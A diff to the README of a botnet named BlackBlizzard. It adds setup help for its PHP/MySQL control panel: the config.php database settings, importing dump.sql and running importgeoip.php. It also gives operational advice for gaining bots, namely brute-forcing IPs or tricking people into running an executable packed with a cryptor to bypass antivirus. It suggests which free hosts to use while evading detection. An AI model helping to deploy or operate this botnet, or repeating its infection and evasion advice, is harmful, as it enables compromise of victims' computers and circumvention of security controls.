@@ -4,9 +4,12 @@ The Source Code For My Botnet BlackBlizzard
 DISCLAIMER : 
 The work you will find here is not enirely original, some parts have been taken from other botnets in the process. But the way it has been
 "mixed" too form this, is an original combination.
+(some parts are original)
 
 # Info
 (Help will not be given to little skids who think it is cool 2 has a kewl botnet but need help on how 2 setup ehehehhehehehehee)
+
+FOR SETUP HELP GOTO THE HELP SECTION
 
 Do not upload this on any webhosting service like InifnityFree or that otherone that people use (the account will be terminated)
 I can confirm this works on a free hosting account from x10hosting.com but if we abuse this they will add detection or smn.
@@ -16,6 +19,11 @@ There are 2 methods of getting bots
 Bruteforce the IP's
 Or get someone stupid enough too download and run the exe (too bypass antiviruses quite easily use a cryptor)
 
+# Help
+
+You need a webserver with php and mysql support (php 5.5 and below a port would be greatly appreciated!)
+
+
 The configuration file is config.php
 change the
 Database username: 
@@ -23,7 +31,7 @@ Database userpass:
 Database DBname:
 Database DBHost: (typically on free hosting services it is localhost unless specified otherwise like on infinity free but you won't use this on there, right?)
 
-# IMPORTANT
+# IMPORTANT HELP
 GOTO YOUR DATABASE AND SELECT IMPORT AND THEN SELECT DUMP.SQL AND UPLOAD THAT
 ONCE FILES HAVE BEEN UPLOADED VISIT THE FILE importgeoip.php ON YOUR WEBBROWSER IT IMPORTS THE IP SPREADSHEET
 ONLY ONCE YOU HAVE DONE THIS CAN YOU PROCEED TO BELOW
